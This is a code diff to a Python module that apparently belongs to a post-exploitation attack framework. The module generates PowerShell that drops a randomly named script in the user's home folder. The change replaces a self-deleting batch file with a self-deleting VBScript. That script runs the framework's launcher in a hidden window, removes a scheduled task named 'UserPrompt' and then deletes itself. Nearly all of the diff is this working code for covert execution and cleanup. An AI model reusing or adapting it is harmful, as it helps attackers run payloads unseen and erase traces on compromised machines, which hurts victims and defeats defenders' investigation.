@@ -27,7 +27,7 @@ class Module:
             'MinPSVersion' : '2',
             
             'Comments': [
-                'something something dark side.'
+                'Self-Deleting VBS: https://community.spiceworks.com/scripts/show/494-delete-a-vbscript-after-it-has-been-run'
             ]
         }
 
@@ -86,7 +86,7 @@ class Module:
 	N=6
 	filename=''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(N))
         moduleSource = '''
-$storage=$Home+"\\'''+filename+'''.bat"
+$storage=$Home+"\\'''+filename+'''.vbs"
 $k=0
 while ($k -eq 0){
 	try {
@@ -96,10 +96,20 @@ while ($k -eq 0){
 	catch {
 	}
 }
-$file="echo @off"
-$file | Out-File $storage -encoding ASCII
-$file="schtasks /delete /tn UserPrompt /f"
-$file | Out-File $storage -encoding ASCII -Append
+
+$file='Function discardScript()';
+$file | Out-File $storage;
+$file='Set objFSO = CreateObject("Scripting.FileSystemObject")';
+$file | Out-File $storage -Append;
+$file='strScript = Wscript.ScriptFullName';
+$file | Out-File $storage -Append;
+$file='objFSO.DeleteFile(strScript)';
+$file | Out-File $storage -Append;
+$file='End Function';
+$file | Out-File $storage -Append;
+$file='Set WinScriptHost = CreateObject("WScript.Shell")';
+$file | Out-File $storage -Append;
+
 	'''
 
 
@@ -113,13 +123,19 @@ $file | Out-File $storage -encoding ASCII -Append
             if launcher == "":
                 print helpers.color("[!] Error in launcher generation.")
                 return ""
-            else:			
-		moduleSource+='$file="start /b '
-		moduleSource+=launcher
-		moduleSource+='"\r\n'
+            else:
 		moduleSource+='''
-$file | Out-File $storage -encoding ASCII -Append
-$file='start /b "" cmd /c del "%~f0"&exit /b'
-$file | Out-File $storage -encoding ASCII -Append
+$file='command="'''+launcher+'''"';
+$file | Out-File $storage -Append;
+$file='WinScriptHost.Run command,0';
+$file | Out-File $storage -Append;
+$file='command="schtasks /delete /tn UserPrompt /f"'
+$file | Out-File $storage -Append;
+$file='WinScriptHost.Run command,0';
+$file | Out-File $storage -Append;
+$file='Set WinScriptHost = Nothing';
+$file | Out-File $storage -Append;
+$file='discardScript()';
+$file | Out-File $storage -Append;
 		'''
                 return moduleSource
